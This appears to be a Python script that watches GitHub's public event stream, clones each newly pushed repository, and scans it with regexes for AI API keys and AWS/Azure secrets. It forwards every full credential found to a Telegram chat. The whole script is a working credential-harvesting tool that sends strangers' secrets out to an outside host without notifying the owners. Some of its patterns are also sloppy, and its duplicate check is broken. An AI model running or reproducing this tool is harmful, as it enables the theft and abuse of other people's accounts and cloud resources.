import os
import re
import math
import json
import time
import shutil
import urllib.request
import urllib.error
import subprocess
from concurrent.futures import ThreadPoolExecutor

# ==========================================
# CONFIGURATION & ENV LOADING
# ==========================================
try:
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env')
    with open(env_path, 'r') as f:
        env_vars = dict(line.strip().split("=", 1) for line in f if "=" in line and not line.startswith("#"))
        TELEGRAM_TOKEN = env_vars.get("TELEGRAM_TOKEN", "").strip()
        TELEGRAM_CHAT_ID = env_vars.get("TELEGRAM_CHAT_ID", "").strip()
        GITHUB_TOKEN = env_vars.get("GITHUB_TOKEN", os.getenv("GITHUB_TOKEN", "")).strip()
except Exception:
    TELEGRAM_TOKEN = ""
    TELEGRAM_CHAT_ID = ""
    GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "")

THREADS = 5
TEMP_DIR = "/tmp/git_clone_scanner"

if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

# ==========================================
# EXTENDED REGEX PATTERNS (AI + CREDS + DATABASES)
# ==========================================
PATTERNS = {
    # AI Model APIs
    "Anthropic API Key": r"sk-ant-api03-[A-Za-z0-9\-_]{80,95}",
    "OpenAI API Key": r"sk-[a-zA-Z0-9]{48}",
    "Google Gemini API Key": r"AIza[0-9A-Za-z\-_]{35}",
    "HuggingFace Token": r"hf_[a-zA-Z0-9]{34}",
    "Cohere API Key": r"[a-zA-Z0-9]{40}",
    # Cloud Infrastructure Secrets
    "AWS Access Key ID": r"AKIA[0-9A-Z]{16}",
    "AWS Secret Access Key": r"(?i)aws_secret_access_key\s*=\s*['\"]?[a-zA-Z0-9/+=]{40}['\"]?",
    "Azure Storage/Client Secret": r"(?i)tenant_id|client_secret.*?['\"][a-zA-Z0-9\-_~.]{20,50}['\"]"
}

def send_telegram_alert(provider, repo_name, match_preview, file_path=""):
    """Sends a formatted alert with full credential and direct file link to Telegram."""
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

    # Build a direct link to the exact file on GitHub
    if file_path:
        file_link = f"https://github.com/{repo_name}/blob/main/{file_path}"
        file_display = file_path
    else:
        file_link = f"https://github.com/{repo_name}"
        file_display = "Click Here"

    message = (
        f"\U0001f6a8 <b>CREDENTIAL LEAK DETECTED</b> \U0001f6a8\n\n"
        f"<b>Type:</b> {provider}\n"
        f"<b>Repository:</b> <a href='https://github.com/{repo_name}'>{repo_name}</a>\n"
        f"<b>File:</b> <a href='{file_link}'>{file_display}</a>\n"
        f"<b>Full Credential:</b>\n<code>{match_preview}</code>"
    )

    data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}).encode('utf-8')
    headers = {"Content-Type": "application/json"}
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Failed to send Telegram alert: {e}")

def get_github_events():
    """Polls GitHub's global public events API for new pushes."""
    url = "https://api.github.com/events"
    headers = {"Accept": "application/vnd.github.v3+json", "User-Agent": "GlobalScanner"}
    if GITHUB_TOKEN:
        headers["Authorization"] = f"token {GITHUB_TOKEN}"

    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return json.loads(response.read().decode('utf-8'))
    except Exception as e:
        print(f"Error fetching GitHub events (rate limit?): {e}")
        return []

def scan_file(filepath, clone_dir):
    """Reads a single file and scans against Regex patterns. Returns the relative file path too."""
    found_secrets = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        relative_path = os.path.relpath(filepath, clone_dir)

        for provider, pattern in PATTERNS.items():
            matches = set(re.findall(pattern, content))
            for match in matches:
                found_secrets.append({"provider": provider, "match": match, "file": relative_path})

    except Exception:
        pass
    return found_secrets

def clone_scan_and_destroy(repo_url, repo_name):
    """The core engine: 1. Clone -> 2. Scan -> 3. Obliterate."""
    repo_hash = str(time.time()).replace('.', '')[-8:]
    clone_dir = os.path.join(TEMP_DIR, repo_hash)

    print(f"[*] Cloning: {repo_name}...")
    try:
        subprocess.run(
            ["git", "clone", "--depth", "1", repo_url, clone_dir],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15
        )
    except subprocess.TimeoutExpired:
        if os.path.exists(clone_dir):
            shutil.rmtree(clone_dir, ignore_errors=True)
        return

    if not os.path.exists(clone_dir):
        return

    try:
        for root, dirs, files in os.walk(clone_dir):
            dirs[:] = [d for d in dirs if d not in ['.git', 'node_modules', 'venv']]
            for file in files:
                filepath = os.path.join(root, file)
                if file.endswith(('.env', '.js', '.py', '.json', '.yml', '.yaml', '.txt', '.md', '.csv', '.rb', '.go')):
                    secrets = scan_file(filepath, clone_dir)
                    for secret in secrets:
                        rel_file = secret.get('file', '')
                        print("\n" + "="*50)
                        print(f"[!] ALERT! Found {secret['provider']} in {repo_name}!")
                        print(f"    File:        {rel_file}")
                        print(f"    Full Secret: {secret['match']}")
                        print("="*50 + "\n")
                        # Send to Telegram with direct file link
                        send_telegram_alert(secret['provider'], repo_name, secret['match'], rel_file)
    finally:
        shutil.rmtree(clone_dir, ignore_errors=True)
        print(f"    [-] Obliterated repo: {repo_name}")

def main():
    print("=" * 60)
    print("STARTING HIGH-SPEED GIT-CLONE SECRET RADAR")
    print(f"Temp Directory: {TEMP_DIR}")
    print(f"Threads: {THREADS}")
    if not TELEGRAM_CHAT_ID:
        print("WARNING: TELEGRAM_CHAT_ID is missing from .env. Alerts will only print to console!")
    print("=" * 60)

    last_event_id = None
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while True:
            events = get_github_events()
            new_repos = []

            for event in events:
                if event['id'] == last_event_id:
                    break
                if event['type'] == 'PushEvent':
                    repo_name = event['repo']['name']
                    repo_url = f"https://github.com/{repo_name}.git"
                    if repo_url not in new_repos:
                        new_repos.append((repo_url, repo_name))

            if events:
                last_event_id = events[0]['id']

            for r_url, r_name in new_repos:
                executor.submit(clone_scan_and_destroy, r_url, r_name)

            time.sleep(10)

if __name__ == "__main__":
    main()
